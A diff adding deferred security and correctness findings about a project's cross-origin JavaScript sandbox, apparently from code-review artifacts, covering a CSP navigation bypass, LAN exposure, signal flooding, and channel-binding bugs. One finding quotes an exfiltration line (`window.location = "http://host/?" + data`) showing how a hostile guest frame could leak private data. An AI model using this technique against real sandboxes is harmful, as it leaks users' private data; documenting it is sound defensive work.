@@ -192,3 +192,23 @@ status: open
 - source_spec: `_bmad-output/implementation-artifacts/spec-5-4-streaming-reasoning.md`
   summary: Provider-key redaction in the chat error path is exact-substring only (`rawCause.split(apiKey).join("***")`), so a key echoed in a non-literal form (URL-encoded, base64, truncated, or nested in a structured error object) would still reach stderr.
   evidence: Inherited from Story 5.2's `answer()` redaction and reused verbatim by 5.4's `answerStream` (including the SDK-emitted `error`-part path). No current provider (Anthropic/OpenAI/Google) echoes the API key in error bodies, so this is latent; a stronger guarantee (redact encoded/partial forms, or emit a fixed generic cause) is preferable given the "key NEVER in any log" invariant.
+
+- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
+  summary: Scripted same-frame navigation (`window.location = "http://host/?" + data`) bypasses `connect-src 'none'`, so a hostile guest can still exfiltrate the user's private `FrozenData`; the "already-public frozen data" comments understate this.
+  evidence: CSP fetch directives (`connect-src`, `img-src`) do not govern top-level/self navigation, and `sandbox="allow-scripts"` without `allow-top-navigation` still permits a frame to navigate ITSELF. The pushed `FrozenData` is the user's real query output, not public data. Closing this is a genuine architectural/security decision (e.g. gating `pushData` on a confirmed handshake so data never lands in a navigated-away frame, and/or a documented residual) rather than a trivial patch — the `pushData(frame, "*")` target-origin is deliberately `"*"` against the guest's opaque origin.
+
+- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
+  summary: In exposed mode (`QS_HOST=0.0.0.0`) the sandbox server binds the same wildcard host as Core (LAN-exposing the tokenless guest) while the injected `__QS_SANDBOX_ORIGIN__` is normalized to `127.0.0.1:<port>`, which is unreachable for a remote browser — the sandbox silently fails to load off-host.
+  evidence: `startCore` passes `bindHost` straight into the sandbox `Bun.serve`, and `deriveOpenUrl` rewrites the injected origin to loopback. The intent-contract Block-If explicitly reserves the exposure model as a human security decision, so the correct exposed-mode posture (loopback-only sandbox + documented "visualization unavailable when exposed", or a reachable remote origin) is a deliberate call, not an unattended patch.
+
+- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
+  summary: The guest→host signal stream (`height`/`error`/`datum-clicked`) is unbounded in rate/count, so a hostile guest can flood `onSignal` — and via `SandboxFrame`'s `setHeight` a React re-render — thrashing the Ring 2 main thread.
+  evidence: `isSandboxOutbound` caps `error.message` length but nothing coalesces or rate-limits frames; each valid `height` triggers `setHeight`. Best addressed when Story 5.6 wires the real renderer (debounce/coalesce height via rAF, rate-limit `onSignal`); no containment breach, but a cheap render-thrash DoS from untrusted code.
+
+- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
+  summary: `SandboxFrame` binds the iframe `contentWindow` exactly once at mount; a null-at-mount window or a later guest-frame reload silently kills the channel (host never built, or the identity gate drops every subsequent message) with no rebind or diagnostic.
+  evidence: The mount `useEffect` has empty deps and returns early if `contentWindow` is null; the host's identity gate is `event.source === iframeWindow` against that single captured window. Both fail closed (no leak) but produce a silently dead sandbox. Re-resolving `contentWindow` on the iframe `load` event and rebuilding/rebinding the host would harden it; low urgency while the component is unwired, natural to fix when 5.6 mounts it for real.
+
+- source_spec: `_bmad-output/implementation-artifacts/spec-5-5-crossorigin-js-sandbox.md`
+  summary: `SandboxFrame` documents `data: null` as "renders an empty guest", but a non-null→null transition pushes nothing, so the guest keeps displaying the prior draw — the documented empty state never happens.
+  evidence: `SandboxFrame.tsx:36` promises the empty-guest behavior; `SandboxFrame.tsx:109` guards `if (loaded && data !== null)` and never clears. A correct fix (push an empty `FrozenData` that passes the guard's `decode`, or restate the contract) needs the empty-state semantics 5.6 will define, so it is deferred rather than papered over.
